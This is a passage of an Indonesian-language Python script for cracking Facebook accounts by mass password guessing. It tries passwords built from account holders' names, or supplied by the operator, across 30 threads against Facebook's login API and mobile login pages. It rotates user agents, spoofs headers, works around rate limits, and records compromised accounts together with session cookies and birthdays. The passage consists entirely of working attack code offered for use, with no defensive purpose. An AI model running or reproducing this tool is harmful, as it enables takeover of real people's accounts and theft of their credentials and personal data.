		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mpilih jawaban dengan benar\x1b[1;97m!"%(M))

def sandimanual():
        print('%s \x1b[1;92m║'%(O))
	print(" \x1b[1;92m[\x1b╠══[1;93m!\x1b[1;92m] \x1b[1;93mgunakan , (koma) \x1b[1;93muntuk pemisah contoh \x1b[1;97m: \x1b[1;93msandi123\x1b[1;97m,sandi12345,\x1b[1;93mdll\x1b[1;97m. \x1b[1;93msetiap kata minimal 6 karakter atau lebih")
	pwek=raw_input('\n \x1b╠══[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan kata sandi \x1b[1;93m: \x1b[1;92m')
	print(' \x1b[1;92m[\x1b╠══[1;93m+\x1b[1;92m] \x1b[1;93mcrack dengan sandi -> \x1b[1;92m[ \x1b[1;93m%s%s%s \x1b[1;92m]' % (M, pwek, N))
	if pwek=="":
		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
	elif len(pwek)<=5:
		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mmasukan sandi minimal 6 angka\x1b[1;97m!"%(M))
        print('%s \x1b[1;92m║'%(O))
	print(" \x1b[1;92m[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]")
        print('%s \x1b[1;92m║'%(O))
	print(" \x1b[1;92m╠══[\x1b[1;93m01\x1b[1;92m] \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;93mfast\x1b[1;92m)")
	print(" \x1b[1;92m╠══[\x1b[1;93m02\x1b[1;92m] \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;93mslow\x1b[1;92m)")
	print(" \x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
	ask=raw_input(" \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
	if ask=="":
		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
	elif ask=="1":
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(api, uid, pwek.split(","))
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
	elif ask=="2":
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(mfbasic, uid, pwek.split(","),"https://mbasic.facebook.com")
		exit(" \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
	elif ask=="3":
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(mfbasic, uid, pwek.split(","),"https://m.facebook.com")
		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
	
def sandiotomatis():
        print('%s \x1b[1;92m║'%(O))
	print(" \x1b[1;92m╠══[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]")
        print('%s \x1b[1;92m║'%(O))
	print(" \x1b[1;92m╠══[\x1b[1;93m01\x1b[1;92m] \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;93mfast\x1b[1;92m)")
	print(" \x1b[1;92m╠══[\x1b[1;93m02\x1b[1;92m] \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;93mslow\x1b[1;92m)")
	print(" \x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
        print('%s \x1b[1;92m║'%(O))
	ask=raw_input(" \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
	if ask=="":
		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
	elif ask=="1":
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(api, uid, pwx)
		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
	elif ask=="2":
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(mfbasic, uid, pwx,"https://mbasic.facebook.com")
		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
	elif ask=="3":
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(mfbasic, uid, pwx,"https://m.facebook.com")
		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
		
### BAGIAN CRACK ###
def api(uid, pwx):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;92m[\x1b[1;93mcrack\x1b[1;92m] %s/%s \x1b[1;92mOK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice([
			'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
			'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
		])
		headers = ({
			'Authorization': 'OAuth 350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
			'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)),
			'x-fb-sim-hni': str(random.randint(20000, 40000)),
			'x-fb-net-hni': str(random.randint(20000, 40000)),
			'x-fb-connection-quality': 'EXCELLENT',
			'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'x-fb-http-engine': 'Liger'
		})
		params = {
			'format': 'JSON',
			'sdk_version': '2',
			'email': str(uid),
			'locale': 'en_US',
			'password': str(pw),
			'sdk': 'ios',
			'generate_session_cookies': '1',
			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
		}
		status_masuk = requests.get("https://b-api.facebook.com/method/auth.login",headers=headers,params=params) 
		file_jason = json.loads(status_masuk.text)
		if "Calls to this api have exceeded the rate limit. (613)" in file_jason:
			t=15
			while t:
				mins, secs = divmod(t, 60)
				sys.stdout.write("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
				sys.stdout.flush()
				sleep(1.5)
				t -= 1
		elif "session_key" in status_masuk.text and "EAAA" in status_masuk.text:
			print("\r  %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("  [OK] %s|%s\n"%(uid, pw))
			break
		elif "User must verify their account on www.facebook.com (405)" in status_masuk.text:
			try:
				token=open("token.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r  %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  %s[CP] %s|%s         "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def mfbasic(uid, pwx,url,**data):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92m[\x1b[1;93mcrack\x1b[1;92m] %s/%s \x1b[1;92mOK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice([
			'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
			'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
		])
		ge=s.get(url+"/login/?next&ref=dbl&refid=8").text
		sop=parser(ge,"html.parser")
		for i in sop.find_all("raw_input"):
			if i.get("name")==None or "_fb_noscript" in i.get("name") or "sign_up" in i.get("name"):continue
			else:data.update({i.get("name"):i.get("value")})
		data.update({"email":uid,"pass":pw})
		log_in=url+sop.find("form",method="post").get("action")
		if "m.facebook.com" in url:
			s.headers.update({"Host":re.findall("//(.+)",url)[0],"x-fb-lsd":data.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		else:
			if "mbasic.facebook.com" in url:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
			else:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
		s.headers.update({"Host":re.findall("//(.+)",url)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":hea,"origin":url,"user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		po=s.post(log_in,data=data)
		if "c_user" in s.cookies.get_dict().keys():
			kukis = ";".join([e+"="+v for e,v in s.cookies.get_dict().items()])
			print("\r  %s[OK] %s|%s|%s"%(H,uid, pw, kukis))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("  [OK] %s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in s.cookies.get_dict().keys():
			try:
				token=open("token.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r  %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  %s[CP] %s|%s         "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def buatfolder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == '__main__':
	os.system("git pull")
	buatfolder()
	menu()
